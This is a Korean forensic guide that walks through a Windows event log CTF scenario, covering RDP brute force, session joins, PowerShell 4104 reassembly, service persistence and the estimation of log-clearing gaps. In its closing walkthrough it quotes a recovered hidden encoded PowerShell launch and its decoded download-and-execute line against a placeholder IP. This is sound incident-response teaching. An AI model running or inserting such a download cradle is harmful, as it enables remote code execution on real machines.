---
id: FOR-0110
title: "Windows 로그 종합 CTF 풀이: RDP 침입부터 로그 삭제까지 4채널 추적"
slug: "windows-log-ctf-walkthrough"
category: "Event Log"
type: "guide"
difficulty: "intermediate"
priority: "critical"
platform: [windows]
artifact: ["Security.evtx", "System.evtx", "PowerShell/Operational", "TerminalServices-LocalSessionManager", "TerminalServices-RemoteConnectionManager", "EVTX"]
file_paths: ["C:\\Windows\\System32\\winevt\\Logs", "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx", "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx"]
registry_paths: []
event_ids: ["21"]
protocols: ["RDP", "SMB", "HTTP"]
tools: ["EvtxECmd", "Timeline Explorer", "PowerShell", "sqlite3", "CyberChef"]
commands: ["EvtxECmd.exe -d 'C:\\case\\winevt' --csv 'C:\\case\\out' --csvf all.csv", "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))"]
regex_patterns: ["[A-Za-z0-9+/]{40,}={0,2}", "-[Ee]{1,2}[NnCcOoDdEeMmAa]*\\s+([A-Za-z0-9+/=]+)"]
wireshark_filters: []
tshark_fields: []
log_fields: ["ScriptBlockText", "ScriptBlockId", "MessageNumber", "MessageTotal", "ContextInfo", "ServiceName", "ImagePath", "TargetLogonId", "Status", "SubStatus", "Param3"]
file_formats: ["evtx", "csv", "base64"]
primary_terms: ["Windows 로그 종합 풀이", "EVTX CTF", "이벤트 로그 종합 분석"]
keywords: ["EVTX CTF", "종합 풀이", "RDP 무차별 대입", "4625 집계", "4104 재조립", "Base64 디코딩", "7045 지속성", "1102 로그 삭제", "EventRecordID gap", "KST 타임라인", "walkthrough"]
aliases: ["evtx ctf 풀이", "윈도우 로그 문제 풀이", "이벤트로그 종합", "rdp 침입 추적", "powershell base64 디코딩", "로그 삭제 구간 추정"]
symptom_keywords: ["EVTX 문제를 어디서 시작할지 모르겠다", "4104가 잘려서 디코딩이 안 된다", "4688에 명령행이 없다", "인과 순서가 뒤집힌다", "로그가 지워진 구간을 메워야 한다", "최종 타임라인을 KST로 정리해야 한다"]
related: ["FOR-0083", "FOR-0107", "FOR-0108"]
source_ids: ["SRC-022", "SRC-023", "SRC-025", "SRC-004"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

Windows 로그 종합 문제는 **4개 채널(Security·System·PowerShell/Operational·TerminalServices)을 EvtxECmd로 한 CSV에 합치고 → 노이즈를 지우고 → 4625 집계로 시작 시각을 잡고 → Logon ID로 세션 활동 전부를 끌어낸 뒤 → 4104를 `ScriptBlockId` 로 재조립해 Base64를 풀고 → 1102와 `EventRecordID` gap으로 은폐 구간을 계산**하는 순서로 끝까지 풀린다.

## 어떤 문제에서 필요한가

- 첨부가 EVTX 여러 개이고 "무슨 일이 있었는지 전부 서술하라"는 문제
- 여러 소문제(계정·IP·URL·서비스 이름·삭제 시각)가 하나의 시나리오로 엮인 문제
- 한 채널에서 막혀 다른 채널로 우회해야 하는 문제
- 최종 답을 KST 타임라인 표로 제출해야 하는 문제

이 글은 **하나의 시나리오를 처음부터 끝까지** 푼다. 개별 기법의 상세는 각 전담 글(FOR-0103~FOR-0109)에 있고, 여기서는 그것들을 이어 붙이는 실제 흐름과 **막히는 지점**을 보여준다.

## 문제에서 처음 볼 단서

1. `Microsoft-Windows-TerminalServices-*` 파일이 있다 → RDP 시나리오 확정
2. `Microsoft-Windows-PowerShell%4Operational.evtx` 가 있다 → 4104에 스크립트 본문이 있다. 여기가 flag 창고
3. `System.evtx` 가 있다 → 7045(서비스 설치)로 지속성을 잡을 수 있다
4. Security.evtx의 마지막 이벤트가 1102다 → 은폐 구간 계산이 소문제 중 하나다
5. 지문에 KST 시각이 있다 → 필터는 UTC(−9시간)로 환산

## 30초 절차

```powershell
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf all.csv
```

채널 분포를 보고 어디에 무엇이 있는지 지도를 만든다.

```powershell
Import-Csv 'C:\case\out\all.csv' |
  Group-Object Channel, EventId | Sort-Object Count -Descending |
  Select-Object -First 30 Name, Count | Format-Table -AutoSize
```

그리고 "존재 자체가 사건"인 이벤트를 먼저 건진다.

```powershell
Import-Csv 'C:\case\out\all.csv' |
  Where-Object { $_.EventId -in 1102,104,4719,1100,7045,4697,4698,4720,4732 } |
  Sort-Object { [datetime]$_.TimeCreated } |
  Format-Table TimeCreated, Channel, EventId, UserName, MapDescription -AutoSize
```

## 상세 절차

### 시나리오

```text
RDP 무차별 대입 -> 관리자 세션 확보 -> PowerShell 다운로더 실행
 -> 서비스 지속성 설치 -> 데이터 수집·반출 -> 감사 로그 삭제
```

각 단계에서 봐야 할 채널과 이벤트다.

| 단계 | 채널 | 이벤트 | 얻는 값 |
| --- | --- | --- | --- |
| 무차별 대입 | Security | 4625 | 시작 시각, 시도 계정, IP, `Status`/`SubStatus` |
| 접속 성공 | Security | 4624 Type 10 | `TargetLogonId`, `WorkstationName` |
| 접속 성공 | RemoteConnectionManager/Operational | 1149 | `Param3` = 원본 주소 |
| 세션 시작 | LocalSessionManager/Operational | 21 | `User`, `SessionID`, 원본 주소 |
| 권한 | Security | 4672 | `PrivilegeList` |
| 실행 | Security | 4688 | `NewProcessName`, PID (`CommandLine` 은 정책 의존) |
| 실행 상세 | PowerShell/Operational | 4103, 4104 | `ContextInfo`, `ScriptBlockText` |
| 지속성 | System | 7045 | `ServiceName`, `ImagePath` |
| 수집·반출 | Security | 5145 | `ShareName`, `RelativeTargetName` |
| 은폐 | Security | 1102 | 삭제 시각, 삭제 계정 |

### 1단계 — 4채널 통합

```powershell
# 폴더 전체를 한 CSV 로 (채널 구분은 Channel 컬럼이 한다)
EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf all.csv
```

파일이 흩어져 있으면 개별로 뽑고 합친다.

```powershell
$out = 'C:\case\out'
EvtxECmd.exe -f 'C:\case\winevt\Security.evtx' --csv $out --csvf sec.csv
EvtxECmd.exe -f 'C:\case\winevt\System.evtx'   --csv $out --csvf sys.csv
EvtxECmd.exe -f 'C:\case\winevt\Microsoft-Windows-PowerShell%4Operational.evtx' --csv $out --csvf ps.csv
EvtxECmd.exe -f 'C:\case\winevt\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx' --csv $out --csvf tslsm.csv
EvtxECmd.exe -f 'C:\case\winevt\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx' --csv $out --csvf tsrcm.csv

# 공통 컬럼만 남겨 하나로
$cols = 'TimeCreated','Channel','EventRecordId','EventId','Computer','Provider','UserName','MapDescription','Payload','SourceFile'
@('sec.csv','sys.csv','ps.csv','tslsm.csv','tsrcm.csv') |
  ForEach-Object { Import-Csv (Join-Path $out $_) | Select-Object $cols } |
  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={$_.Channel}}, @{e={[int64]$_.EventRecordId}} |
  Export-Csv -NoTypeInformation -Encoding UTF8 (Join-Path $out 'merged.csv')
```

통합 절차의 상세(중복 제거·컬럼 정규화·sqlite)는 FOR-0107에 있다.

### 2단계 — 노이즈 제거

```powershell
$all = Import-Csv 'C:\case\out\merged.csv'

$clean = $all | Where-Object {
  $_.Payload -notmatch '"TargetUserName":\s*"[^"]*\$"' -and
  $_.Payload -notmatch '0x3e7|0x3e5|0x3e4' -and
  $_.UserName -notmatch '^UMFD-|^DWM-|ANONYMOUS' -and
  $_.EventId -notin 5379,4798,5058,5061,4658,4690
}
'{0} -> {1} rows' -f $all.Count, $clean.Count
```

출력 예시:

```text
143829 -> 11204 rows
```

**13배 줄었다.** 여기서 줄지 않으면 payload 표기가 필터와 안 맞는 것이다. payload 한 줄을 눈으로 본다.

```powershell
$all | Where-Object { $_.EventId -eq 4624 } | Select-Object -First 1 -ExpandProperty Payload
```

### 3단계 — 4625 집계로 공격 시작 시각 확정

```powershell
$fails = $clean | Where-Object { $_.EventId -eq 4625 } | ForEach-Object {
  $ip = if ($_.Payload -match '"IpAddress":\s*"([^"]*)"') { $Matches[1] } else { '' }
  $u  = if ($_.Payload -match '"TargetUserName":\s*"([^"]*)"') { $Matches[1] } else { '' }
  $st = if ($_.Payload -match '"SubStatus":\s*"([^"]*)"') { $Matches[1] } else { '' }
  [pscustomobject]@{ TimeUTC = $_.TimeCreated; Ip = $ip; User = $u; SubStatus = $st }
}

$fails | Group-Object Ip | Sort-Object Count -Descending | ForEach-Object {
  $g = $_.Group | Sort-Object { [datetime]$_.TimeUTC }
  [pscustomobject]@{
    Ip     = $_.Name
    Fails  = $_.Count
    First  = $g[0].TimeUTC
    Last   = $g[-1].TimeUTC
    Users  = (($g.User | Sort-Object -Unique) -join ',')
    Subs   = (($g.SubStatus | Sort-Object -Unique) -join ',')
  }
} | Format-Table -AutoSize
```

출력 예시:

```text
Ip             Fails First                 Last                  Users                     Subs
203.0.113.77     214 2026-03-14 07:11:02Z  2026-03-14 07:18:39Z  administrator,admin,svc_backup,root  0xc000006a,0xc0000064
192.168.10.31      2 2026-03-14 02:14:50Z  2026-03-14 02:14:52Z  jhkim                     0xc000006a
```

`SubStatus` 로 공격의 성격이 드러난다.

| `SubStatus` | 의미 | 읽는 법 |
| --- | --- | --- |
| `0xC0000064` | 사용자가 존재하지 않는다 | 계정 이름을 **추측**하고 있다 = 사전 공격 |
| `0xC000006A` | 비밀번호가 틀렸다 | 계정은 맞다. 비밀번호를 대입 중 |
| `0xC0000072` | 계정이 비활성 | — |
| `0xC0000234` | 계정이 잠김 | 잠금 정책이 작동했다 |
| `0xC000006F` / `0xC0000070` | 허용 시간/워크스테이션 제한 | 정책 위반 |

`0xC0000064` 와 `0xC000006A` 가 섞여 있으면 **계정 열거 후 비밀번호 대입**이다. 214건이 7분 37초에 몰렸으므로 사람이 아니라 도구다.

**공격 시작 = 2026-03-14 07:11:02Z = 16:11:02 KST.**

### 4단계 — 4624 Type 10 + 1149 + 21 로 접속 확정

세 채널이 같은 접속을 가리키는지 대조한다. **하나만으로는 프록시·점프 호스트 경유를 구분할 수 없다.**

```powershell
# (1) Security 4624 Type 10
$clean | Where-Object { $_.EventId -eq 4624 -and $_.Payload -match '"LogonType":\s*"?10' } |
  ForEach-Object {
    $u = if ($_.Payload -match '"TargetUserName":\s*"([^"]*)"') { $Matches[1] } else { '' }
    $i = if ($_.Payload -match '"IpAddress":\s*"([^"]*)"') { $Matches[1] } else { '' }
    $l = if ($_.Payload -match '"TargetLogonId":\s*"([^"]*)"') { $Matches[1] } else { '' }
    $w = if ($_.Payload -match '"WorkstationName":\s*"([^"]*)"') { $Matches[1] } else { '' }
    [pscustomobject]@{ TimeUTC=$_.TimeCreated; RecId=$_.EventRecordId; User=$u; Ip=$i; LogonId=$l; Wks=$w }
  } | Format-Table -AutoSize

# (2) RemoteConnectionManager 1149 (UserData 구조 — EventData 파싱 코드가 안 통한다)
Get-WinEvent -Path 'C:\case\winevt\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx' -Oldest |
  Where-Object { $_.Id -eq 1149 } |
  ForEach-Object {
    [pscustomobject]@{
      TimeUTC = $_.TimeCreated.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss')
      RecId   = $_.RecordId
      Xml     = ([xml]$_.ToXml()).Event.UserData.InnerXml
    }
  } | Format-List

# (3) LocalSessionManager 21 (세션 로그온 성공)
Get-WinEvent -Path 'C:\case\winevt\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx' -Oldest |
  Where-Object { $_.Id -in 21,24,25 } |
  ForEach-Object {
    [pscustomobject]@{
      TimeUTC = $_.TimeCreated.ToUniversalTime().ToString('yyyy-MM-dd HH:mm:ss')
      Id      = $_.Id
      RecId   = $_.RecordId
      Xml     = ([xml]$_.ToXml()).Event.UserData.InnerXml
    }
  } | Format-Table -AutoSize
```

`Get-WinEvent` 의 `TimeCreated` 는 **로컬 시각**이다. `ToUniversalTime()` 없이 EvtxECmd CSV(UTC)와 같은 표에 올리면 9시간 어긋난다.

세 채널의 대조 결과 예시:

```text
Security 4624   07:19:02Z  svc_backup  203.0.113.77  0x1a2b3c  Wks=KALI
TS-RCM   1149   07:19:01Z  Param1=svc_backup  Param2=(공백)  Param3=203.0.113.77
TS-LSM   21     07:19:03Z  User=WS01\svc_backup  SessionID=3  Address=203.0.113.77
```

세 IP가 모두 `203.0.113.77` → 직접 접속이다. 불일치하면 경유지가 있다.

### 5단계 — Logon ID로 세션 활동 전부

```powershell
$lid = '0x1a2b3c'

# 그 세션의 짝(UAC 분리 토큰)도 함께 찾는다
$linked = $clean | Where-Object { $_.EventId -eq 4624 -and $_.Payload -match [regex]::Escape($lid) } |
  ForEach-Object { if ($_.Payload -match '"TargetLinkedLogonId":\s*"([^"]*)"') { $Matches[1] } }
$keys = @($lid) + ($linked | Where-Object { $_ -and $_ -ne '0x0' })
$keys = $keys | Sort-Object -Unique
$keys

# 두 키로 세션 활동 전부 (같은 초는 채널 안에서 RecordId 로 정렬)
$pattern = ($keys | ForEach-Object { [regex]::Escape($_) }) -join '|'
$session = $clean | Where-Object { $_.Payload -match $pattern } |
  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={$_.Channel}}, @{e={[int64]$_.EventRecordId}}

$session | Format-Table TimeCreated, Channel, EventRecordId, EventId, MapDescription -AutoSize
$session.Count
```

세션 조인의 상세(필드 매핑·16진수 정규화·재사용 함정)는 FOR-0104에 있다.

### 6단계 — 4104 재조립과 Base64 디코딩

**긴 스크립트 블록은 여러 개의 4104로 쪼개져 기록된다.** 조각 하나만 보면 Base64가 잘려 디코딩이 실패한다.

| 필드 | 역할 |
| --- | --- |
| `ScriptBlockId` | **같은 스크립트 블록의 조각들을 묶는 키** (GUID) |
| `MessageNumber` | 조각 번호 (1부터) |
| `MessageTotal` | 전체 조각 수 |
| `ScriptBlockText` | 그 조각의 본문 |
| `Path` | 스크립트 파일 경로 (파일에서 실행된 경우) |

```powershell
# ScriptBlockId 로 묶어 MessageNumber 순서대로 이어 붙인다
$blocks = Get-WinEvent -Path 'C:\case\winevt\Microsoft-Windows-PowerShell%4Operational.evtx' -Oldest -FilterXPath '*[System[(EventID=4104)]]' |
  ForEach-Object {
    $x = [xml]$_.ToXml(); $d = @{}
    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    [pscustomobject]@{
      TimeUTC = $x.Event.System.TimeCreated.SystemTime
      RecId   = $_.RecordId
      Id      = $d['ScriptBlockId']
      No      = [int]$d['MessageNumber']
      Total   = [int]$d['MessageTotal']
      Path    = $d['Path']
      Text    = $d['ScriptBlockText']
    }
  }

$blocks | Group-Object Id | ForEach-Object {
  $parts = $_.Group | Sort-Object No
  [pscustomobject]@{
    ScriptBlockId = $_.Name
    Parts         = '{0}/{1}' -f $parts.Count, $parts[0].Total
    FirstUTC      = ($parts | Sort-Object { [datetime]$_.TimeUTC })[0].TimeUTC
    Path          = $parts[0].Path
    Full          = ($parts.Text -join '')
  }
} | Sort-Object FirstUTC | Format-Table ScriptBlockId, Parts, FirstUTC, Path -AutoSize
```

`Parts` 가 `3/5` 처럼 총 개수보다 적으면 **조각이 소실된 것**이다. 그 상태로 디코딩하면 실패한다. 조각이 없는 이유는 롤오버·삭제·정책 변경이며 판별은 FOR-0109 절차를 따른다.

재조립한 본문에서 Base64를 뽑아 디코딩한다.

```powershell
# 재조립된 본문 하나를 고른다
$full = ($blocks | Group-Object Id | ForEach-Object {
  ($_.Group | Sort-Object No).Text -join ''
}) | Where-Object { $_ -match 'FromBase64String|-enc|DownloadString' } | Select-Object -First 1

$full

# -EncodedCommand / -enc 의 값은 UTF-16LE Base64 다
if ($full -match '(?i)-e(?:nc(?:odedcommand)?)?\s+([A-Za-z0-9+/=]{20,})') {
  $b64 = $Matches[1]
  [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
}

# 스크립트 안에 박힌 일반 Base64 (ASCII/UTF-8) 는 이렇게 푼다
if ($full -match "FromBase64String\('([A-Za-z0-9+/=]+)'\)") {
  [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Matches[1]))
}
```

| 상황 | 인코딩 | 디코딩 |
| --- | --- | --- |
| `powershell -enc <값>` | **UTF-16LE (Unicode)** | `[Text.Encoding]::Unicode.GetString(...)` |
| `-EncodedCommand <값>` | UTF-16LE | 동일 |
| 스크립트 안의 `FromBase64String('...')` | 보통 UTF-8/ASCII | `[Text.Encoding]::UTF8.GetString(...)` |
| Gzip + Base64 | 압축 | Base64 해제 후 `GZipStream` 으로 압축 해제 |

**`-enc` 를 UTF-8로 디코딩하면 글자 사이에 널 바이트가 보이는 깨진 문자열이 나온다.** 그것이 UTF-16LE라는 신호다.

`CommandLine` 이 비어 있어 `-enc` 값 자체를 못 구할 때는 4103으로 우회한다.

```powershell
# 4103 의 ContextInfo 에 Host Application(전체 명령행)이 들어 있다
Get-WinEvent -Path 'C:\case\winevt\Microsoft-Windows-PowerShell%4Operational.evtx' -Oldest -FilterXPath '*[System[(EventID=4103)]]' |
  ForEach-Object {
    $x = [xml]$_.ToXml(); $d = @{}
    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    $ctx = $d['ContextInfo']
    if ($ctx -match '(?m)Host Application\s*=\s*(.+)$') {
      [pscustomobject]@{
        TimeUTC = $x.Event.System.TimeCreated.SystemTime
        RecId   = $_.RecordId
        HostApp = $Matches[1].Trim()
      }
    }
  } | Sort-Object RecId | Format-Table -AutoSize
```

`ContextInfo` 는 여러 줄 텍스트다. `Host Application` 외에 `User`, `Connected User`, `Command Name`, `Command Type` 등이 들어 있고, 라인 이름은 로케일에 따라 번역될 수 있다. **한국어 Windows에서는 항목 이름이 한글일 수 있으므로 실제 값을 한 번 출력해 확인한다.**

### 7단계 — 7045로 지속성 확정

```powershell
Get-WinEvent -Path 'C:\case\winevt\System.evtx' -Oldest -FilterXPath '*[System[(EventID=7045)]]' |
  ForEach-Object {
    $x = [xml]$_.ToXml(); $d = @{}
    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    [pscustomobject]@{
      TimeUTC   = $x.Event.System.TimeCreated.SystemTime
      RecId     = $_.RecordId
      Service   = $d['ServiceName']
      ImagePath = $d['ImagePath']
      StartType = $d['StartType']
      Account   = $d['AccountName']
    }
  } | Format-Table -AutoSize
```

| 판정 기준 | 악성 신호 |
| --- | --- |
| `ImagePath` 가 사용자 쓰기 가능 경로 | `C:\Users\...`, `C:\ProgramData\...`, `C:\Windows\Temp\...` |
| `ImagePath` 에 인터프리터가 들어 있다 | `cmd.exe /c`, `powershell.exe -enc`, `rundll32` |
| `ServiceName` 이 정상 서비스를 흉내낸다 | `WinUpdateSvc`, `WindowsUpdater` 등 실제로 없는 이름 |
| 설치 시각이 공격자 세션 구간 안 | Logon ID 조인으로 확인 |
| `StartType` 이 자동 | 재부팅 후에도 살아남는다 |

**정상 소프트웨어 설치도 7045를 남긴다.** 여러 개가 나오면 위 표로 걸러야 답이 하나로 좁혀진다.

### 8단계 — 1102와 EventRecordID gap으로 삭제 구간 추정

```powershell
# (1) 1102 를 찾는다
$clean | Where-Object { $_.EventId -in 1102,104 } |
  Select-Object TimeCreated, Channel, EventId, EventRecordId, UserName | Format-Table -AutoSize

# (2) Security 채널의 첫/마지막 레코드와 번호 누락
$sec = $all | Where-Object { $_.Channel -eq 'Security' } | Sort-Object { [int64]$_.EventRecordId }
[pscustomobject]@{
  FirstId   = $sec[0].EventRecordId
  FirstTime = $sec[0].TimeCreated
  LastId    = $sec[-1].EventRecordId
  LastTime  = $sec[-1].TimeCreated
  Count     = $sec.Count
  Missing   = ([int64]$sec[-1].EventRecordId - [int64]$sec[0].EventRecordId + 1) - $sec.Count
} | Format-List

# (3) 다른 채널은 그 이후에도 기록됐는가 (삭제 vs 전원 종료 구분)
$all | Group-Object Channel | ForEach-Object {
  $g = $_.Group | Sort-Object { [datetime]$_.TimeCreated }
  [pscustomobject]@{ Channel = $_.Name; LastTime = $g[-1].TimeCreated }
} | Format-Table -AutoSize
```

판정 논리:

| 관찰 | 결론 |
| --- | --- |
| 1102가 Security의 **마지막 레코드** | 삭제 시각 이후 Security 구간이 통째로 소실 |
| 1102 이후 Security에 이벤트가 있다 | 지워진 것은 **1102 이전** 구간. 번호 재시작 지점을 찾는다 |
| Security만 끊기고 System/PowerShell은 계속 기록 | **로그를 지운 것.** 시스템이 꺼진 것이 아니다 |
| 전 채널이 같은 시각에 끊김 | 전원 종료 또는 이미지 획득 시점 |
| `Missing` > 0 | 그만큼의 레코드가 사라졌다. 선택적 제거 또는 손상 |

삭제 구간의 길이는 이렇게 계산한다.

```text
소실 구간 = (1102 시각) ~ (다른 채널의 마지막 이벤트 시각 또는 이미지 획득 시각)
```

번호 판독의 상세는 FOR-0103에 있다. 그 구간을 디스크 artifact로 메우는 방법은 FOR-0109와 [FOR-0050](./ntfs-artifact-timeline.html)이다.

### 9단계 — 최종 타임라인을 KST로

**EVTX `SystemTime` 은 UTC다. 답이 KST면 +9시간.** 축은 끝까지 UTC로 두고 제출 직전에만 변환한다.

```powershell
$picked = @(1184188,1184571,1184572,1184574,1184880,1185204)   # Security
$session | Where-Object { [int64]$_.EventRecordId -in $picked } |
  Select-Object @{n='KST';e={ ([datetime]$_.TimeCreated).AddHours(9).ToString('yyyy-MM-dd HH:mm:ss') }},
                @{n='UTC';e={ $_.TimeCreated }},
                Channel, EventId, EventRecordId, UserName, MapDescription |
  Export-Csv -NoTypeInformation -Encoding UTF8 'C:\case\out\final_timeline.csv'
```

## 출력 필드 해석

| 필드 | 채널 | 이 문제에서의 역할 |
| --- | --- | --- |
| `SubStatus` (4625) | Security | 계정 열거인지 비밀번호 대입인지 판정 |
| `TargetLogonId` (4624) | Security | 세션 활동 전부의 조인 키 |
| `TargetLinkedLogonId` (4624) | Security | UAC 분리 토큰의 짝. 놓치면 활동 절반이 빠진다 |
| `Param3` (1149) | TS-RemoteConnectionManager | RDP 원본 주소 |
| `SessionID` (21/24/25) | TS-LocalSessionManager | 세션 번호. 재접속 추적 |
| `ScriptBlockId` (4104) | PowerShell | **조각 재조립 키** |
| `MessageNumber` / `MessageTotal` (4104) | PowerShell | 조각 순서와 총 개수 |
| `ScriptBlockText` (4104) | PowerShell | 스크립트 본문 |
| `ContextInfo` (4103) | PowerShell | Host Application = 전체 명령행 (4688 우회) |
| `ServiceName` / `ImagePath` (7045) | System | 지속성 수단의 이름과 실행 대상 |
| `EventRecordId` | 전 채널 | 같은 초 순서와 삭제 구간 판정 |

## pivot: 다음에 볼 artifact

| 여기서 얻은 것 | 다음 목표 | 무엇을 확인하나 |
| --- | --- | --- |
| 공격자 IP | pcap ([FOR-0146](./wireshark-30sec-triage.html)) | 실제 전송량, 반출 내용 |
| 다운로드 URL | pcap의 HTTP, 브라우저·프록시 로그 | 받아 온 파일 |
| 7045 `ImagePath` 의 파일 | `$MFT` ([FOR-0021](./mft-basics.html)) | 그 파일이 언제 만들어졌나 |
| 삭제된 로그 구간 | `$MFT` / `$J` ([FOR-0050](./ntfs-artifact-timeline.html)) | 그 구간의 파일 활동 |
| 세션 계정 | 4624 상세 ([FOR-0083](./event-4624-logon.html)) | Logon Type과 권한 |
| 반출 파일명 | `$Recycle.Bin`, LNK | 삭제·열람 흔적 |
| 4104 본문의 함수 이름 | 메모리 덤프 | 실행 중이던 잔재 |

## 흔한 함정

- **4104 조각 하나만 보고 Base64를 디코딩하는 것.** 긴 블록은 `MessageTotal` 개로 쪼개진다. 잘린 Base64는 디코딩 예외를 던지거나 엉뚱한 문자열을 낸다. → `ScriptBlockId` 로 묶어 `MessageNumber` 순서대로 이어 붙인다.
- **`-enc` 값을 UTF-8로 디코딩하는 것.** UTF-16LE다. 글자 사이에 널이 끼인 깨진 결과가 나온다. → `[Text.Encoding]::Unicode`.
- **`CommandLine` 이 비어 있는 것을 "인자 없이 실행"으로 읽는 것.** 명령행 기록은 별도 정책이다. → 4103 `ContextInfo` 의 Host Application, Sysmon 1, 4104로 우회한다.
- **`Get-WinEvent` 결과와 EvtxECmd CSV를 같은 표에 섞는 것.** 앞은 로컬 시각, 뒤는 UTC다. → `ToUniversalTime()` 으로 맞춘다.
- **같은 초 순서를 시각으로 정하는 것.** 4624와 4672가 같은 초에 있으면 인과가 뒤집혀 보인다. → 채널 안에서 `EventRecordId` 로 정렬한다.
- **채널이 다른 두 이벤트를 `EventRecordId` 로 비교하는 것.** 번호는 채널별 독립이다. → 시각과 인과로 정한다.
- **1149/21/24/25를 `EventData` 로 파싱하는 것.** 이 이벤트들은 `UserData` 구조다. → `UserData.InnerXml` 을 읽는다.
- **`WorkstationName` 을 단말 증거로 쓰는 것.** 클라이언트가 신고한 값이다. → IP를 확증값으로 쓴다 (FOR-0106).
- **7045 하나만 보고 지속성을 확정하는 것.** 정상 설치도 7045를 남긴다. → `ImagePath` 의 경로와 그 파일의 생성 흔적으로 가른다.
- **1102를 "로그를 지웠다"로만 쓰는 것.** 소실 구간의 길이를 계산해야 소문제가 풀린다. → 1102가 마지막 레코드인지, 다른 채널은 계속 기록됐는지 대비한다.
- **UAC 분리 토큰의 한쪽만 조인하는 것.** 승격 없이 실행한 프로세스가 빠진다. → `TargetLinkedLogonId` 로 키 집합을 만든다.
- **KST 지문을 UTC 필터에 그대로 넣는 것.** 9시간 어긋난 구간을 뒤진다. → 지문 KST − 9시간으로 필터하고, 답만 +9시간.
- **필터 걸린 CSV로 gap을 판정하는 것.** 번호가 당연히 빈다. → gap 판정용 전체 CSV를 따로 뽑는다.

## 교차검증

```powershell
# 1) 4625 마지막 실패와 4624 성공이 이어지는가 (같은 IP, 같은 계정)
$clean | Where-Object { $_.EventId -in 4625,4624 -and $_.Payload -match '203\.0\.113\.77' } |
  Sort-Object @{e={[datetime]$_.TimeCreated}}, @{e={[int64]$_.EventRecordId}} |
  Select-Object -Last 5 TimeCreated, EventRecordId, EventId, UserName

# 2) 세 채널의 접속 시각과 IP 가 일치하는가
#    (4624 / 1149 / 21 — 4단계의 세 블록 결과를 나란히 놓고 본다)

# 3) 4104 조각 수가 MessageTotal 과 같은가
$blocks | Group-Object Id | ForEach-Object {
  [pscustomobject]@{ Id = $_.Name; Have = $_.Count; Total = $_.Group[0].Total }
} | Where-Object { $_.Have -ne $_.Total }

# 4) 7045 의 서비스가 이후 실제로 기동했는가 (4624 Type 5 또는 7036/7040)
$all | Where-Object { $_.Payload -match 'WinUpdateSvc' } |
  Select-Object TimeCreated, Channel, EventId, MapDescription | Sort-Object TimeCreated

# 5) 1102 가 Security 의 마지막 레코드인가
$sec | Select-Object -Last 3 EventRecordId, TimeCreated, EventId

# 6) 디코딩 결과의 URL 이 다른 흔적에도 있는가
$all | Where-Object { $_.Payload -match '203\.0\.113\.77' } |
  Group-Object Channel, EventId | Select-Object Name, Count
```

## mini walkthrough

```text
문제:
"WS01 이 침해되었습니다. 다음을 구하세요.
 (1) 공격 시작 시각(KST)  (2) 탈취된 계정  (3) 다운로더가 접속한 URL
 (4) 지속성 수단의 서비스 이름  (5) 로그가 삭제된 구간
 마지막에 전체 타임라인을 KST 로 제출하세요.
 첨부: winevt/ (Security, System, PowerShell%4Operational,
       TerminalServices-LocalSessionManager, TerminalServices-RemoteConnectionManager)"

0. 통합
   EvtxECmd.exe -d 'C:\case\winevt' --csv 'C:\case\out' --csvf all.csv
   -> 143,829 행
   노이즈 제거 후 11,204 행

1. (1) 공격 시작 — 4625 집계
   203.0.113.77 : 214건, 07:11:02Z ~ 07:18:39Z
   SubStatus 0xc0000064 + 0xc000006a 혼재 -> 계정 열거 후 비밀번호 대입
   => 07:11:02Z = 16:11:02 KST

2. (2) 탈취 계정 — 4624 Type 10
   07:19:02Z  svc_backup  203.0.113.77  LogonId 0x1a2b3c  Wks=KALI
   1149 Param3 = 203.0.113.77, TS-LSM 21 Address = 203.0.113.77
   세 채널 일치 -> 직접 접속 확정
   4672 가 같은 초에 존재 (RecId 1184572) -> 관리자 권한 세션
   => 계정 svc_backup

3. 첫 시도 (실패) — 4688 로 실행 명��을 보려 했다
   $clean | Where-Object { $_.EventId -eq 4688 } | Select -First 3 -ExpandProperty Payload
   -> NewProcessName 은 있는데 CommandLine 이 "" 로 비어 있다.

   "powershell.exe 가 실행됐다"까지는 알지만 무엇을 받아 왔는지 알 수 없다.
   여기서 "URL 은 로그에 없다" 로 결론 내리면 (3) 을 놓친다.

   무엇이 틀렸나:
     4688 의 CommandLine 은 별도 정책을 켜야 채워진다.
     이 호스트는 그 정책이 꺼져 있었다.
     "인자 없음"이 아니라 "기록되지 않음"이다.

   우회:
     PowerShell/Operational 4103 의 ContextInfo -> Host Application
     07:20:08Z  Host Application = powershell.exe -nop -w hidden -enc SQBFAFgAI...
     전체 명령행 확보.

4. 두 번째 시도 (실패) — 4104 조각 하나로 디코딩
   4104 를 시각순으로 보고 첫 번째 것의 ScriptBlockText 에서 Base64 를 뽑았다.

   [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
   -> "Base64 문자열의 길이가 잘못되었습니다" 예외

   길이를 4의 배수로 맞추려고 '=' 를 붙여 봤더니 앞부분만 읽히고 URL 이 안 나왔다.

   무엇이 틀렸나:
     그 스크립트 블록은 5조각으로 쪼개져 기록됐다.
     MessageNumber=1, MessageTotal=5 였다.
     조각 하나의 ScriptBlockText 만으로는 Base64 가 잘려 있다.

   해결:
     ScriptBlockId 로 묶고 MessageNumber 순서대로 이어 붙였다.
     Parts 5/5 확인 후 디코딩:

     [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
     -> IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/a.ps1')

